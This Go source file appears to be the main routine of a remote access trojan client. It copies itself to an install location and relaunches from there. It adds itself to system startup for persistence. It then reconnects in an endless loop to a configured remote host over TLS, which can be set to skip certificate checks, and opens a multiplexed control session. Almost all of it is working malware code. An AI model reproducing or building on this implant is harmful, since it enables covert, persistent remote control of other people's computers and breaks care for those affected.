package main

import (
	"crypto/tls"
	"fmt"
	"os"
	"os/exec"
	"rat/client/install"
	"rat/client/startup"
	"rat/internal"
	"rat/internal/installpath"
	"time"

	"github.com/xtaci/smux"
)

var conn *tls.Conn

func main() {
	err := ParseConfig()
	if err != nil {
		fmt.Println(err.Error())
		return
	}

	if Config.Install != installpath.None && !install.IsInstalled(Config.Install) {
		fmt.Println("Not installed, installing...")
		file, err := install.Install(Config.Name, Config.Install)
		if err != nil {
			fmt.Println("install:", err.Error())
		} else {
			fmt.Println("Installed to", file)
			err = exec.Command(file).Start()
			if err != nil {
				fmt.Println(err.Error())
			} else {
				os.Exit(0)
			}
		}
	}

	err = startup.InstallCurrent(Config.Name)
	if err != nil {
		fmt.Println("Install failed:", err.Error())
	}

	for {
		fmt.Println("disconnect", connect(Config))
		time.Sleep(time.Second * time.Duration(Config.Delay))
	}
}

func connect(config shared.BinaryConfig) error {
	host := config.Host
	fmt.Println("Connecting to", host)

	var err error
	conn, err = tls.Dial("tcp", host, &tls.Config{
		InsecureSkipVerify: Config.InvalidSSL,
	})
	if err != nil {
		return err
	}

	session, _ := smux.Client(conn, nil)

	con, err := NewConnection(session)
	if err != nil {
		return err
	}

	go con.writeLoop()
	go con.recvLoop()

	con.Init()
	<-con.die

	return err
}

func Uninstall() {
	startup.Uninstall(Config.Name)
}
